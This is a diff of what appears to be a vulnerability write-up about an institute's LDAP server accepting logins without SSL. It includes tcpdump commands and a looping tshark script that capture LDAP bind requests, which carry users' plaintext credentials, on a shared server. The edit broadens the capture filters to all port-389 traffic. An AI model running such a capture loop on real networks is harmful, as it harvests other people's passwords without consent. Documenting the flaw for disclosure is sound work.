@@ -28,7 +28,7 @@ However, what truly alarmed me was that the server was not utilizing SSL for dat
 ## Network Traffic Capture
 To verify my suspicions, I launched **tcpdump** on a remote server at our institute where I had root access and where users can SSH in using their Computer Center credentials. I began intercepting the network traffic on that server. Specifically, I filtered for port 389 to capture only LDAP traffic.
 ```bash
-sudo /usr/sbin/tcpdump -s 65535 -w network_traffic_capture.pcap 'tcp port 389 and src 172.31.1.148 and dst 172.31.1.1'
+sudo /usr/sbin/tcpdump -s 65535 -w network_traffic_capture.pcap 'tcp port 389'
 ```
 After successfully logging into the server using my Computer Center credentials on another terminal, I stopped the network capture and downloaded the pcap file for further analysis.
 ## Network Traffic Analysis
@@ -43,7 +43,7 @@ Next, I created a simple bash script that utilized **tshark** to capture LDAP ne
 index=0
 
 while true; do
-	/usr/sbin/tshark -w webhome.pcap -i 1 -f "tcp port 389 and host 172.31.1.148 and dst host 172.31.1.1" -a filesize:100000
+	/usr/sbin/tshark -w webhome.pcap -i 1 -f "tcp port 389" -a filesize:100000
 	/usr/sbin/tshark -r webhome.pcap -R "frame contains \"ou=People,dc=iitk,dc=ac,dc=in\" and ldap.bindRequest" -w webhome_filtered_${index}.pcap
 	chmod 600 webhome_filtered_${index}.pcap
 	rm -f webhome.pcap
